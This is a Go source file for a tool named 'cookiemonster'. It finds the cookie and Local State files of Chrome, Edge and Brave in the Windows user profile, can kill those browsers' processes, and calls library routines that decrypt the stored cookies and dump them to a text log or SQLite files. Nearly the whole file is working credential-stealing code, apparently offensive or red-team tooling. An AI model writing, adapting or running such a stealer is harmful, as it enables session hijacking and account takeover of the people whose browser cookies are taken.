package main

import (
	"fmt"
	"log"
	"os"
	"path/filepath"

	"github.com/yanard18/cookiemonster"
	"github.com/yanard18/cookiemonster/internal/browser"
	"github.com/yanard18/cookiemonster/internal/toolargs"
)

var (
	EdgeLocalState   = fmt.Sprintf(`C:\Users\%s\AppData\Local\Microsoft\Edge\User Data\Local State`, os.Getenv("USERNAME"))
	EdgeCookies      = fmt.Sprintf(`C:\Users\%s\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies`, os.Getenv("USERNAME"))
	ChromeLocalState = fmt.Sprintf(`C:\Users\%s\AppData\Local\Google\Chrome\User Data\Local State`, os.Getenv("USERNAME"))
	ChromeCookies    = fmt.Sprintf(`C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies`, os.Getenv("USERNAME"))
	BraveLocalState  = fmt.Sprintf(`C:\Users\%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State`, os.Getenv("USERNAME"))
	BraveCookies     = fmt.Sprintf(`C:\Users\%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies`, os.Getenv("USERNAME"))
)

type CookieFilesPair struct {
	StateFile   string
	CookiesFile string
}

func main() {
	args, err := toolargs.ParseArgs()
	if err != nil {
		log.Fatalf("Error parsing arguments: %v", err)
	}

	if args.Output != "" && args.Format == "text" {
		f, err := os.OpenFile(args.Output, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			log.Fatalf("Error opening output file: %v", err)
		}
		defer f.Close()

		log.SetOutput(f)
	}

	log.SetFlags(0)
	log.Println(cookiemonster.AsciiArt)

	log.SetFlags(log.LstdFlags | log.Lmicroseconds)

	if args.KillBrowsers {
		log.Println("[*] Killing browser processes")
		browser.KillEdgeProcess()
		browser.KillChromeProcess()
		browser.KillBraveProcess()
		// cookiemonster.KillFirefoxProcess() it's not chromium based
	}

	var filePair []CookieFilesPair

	if args.Auto {
		filePair = append(filePair, CookieFilesPair{StateFile: ChromeLocalState, CookiesFile: ChromeCookies})
		filePair = append(filePair, CookieFilesPair{StateFile: EdgeLocalState, CookiesFile: EdgeCookies})
		filePair = append(filePair, CookieFilesPair{StateFile: BraveLocalState, CookiesFile: BraveCookies})
	} else {
		filePair = append(filePair, CookieFilesPair{StateFile: args.StateFile, CookiesFile: args.CookiesFile})
	}

	for _, pair := range filePair {
		log.Printf("[*] Parsing cookies from %s\n", pair.CookiesFile)
		cookies, err := cookiemonster.GetCookies(pair.StateFile, pair.CookiesFile)
		if err != nil {
			log.Printf("[-] Error parsing cookies: %v\n\n", err)
			continue
		}

		if args.Format == "sql" {
			err := cookiemonster.SaveAsSQL(cookies, filepath.Base(pair.CookiesFile)+".sqlite3")
			if err != nil {
				log.Printf("[-] Error saving cookies: %v\n\n", err)
				continue
			}
		} else {
			err := cookiemonster.LogAsText(cookies)
			if err != nil {
				log.Printf("[-] Error logging cookies: %v\n\n", err)
				continue
			}
		}

	}
}
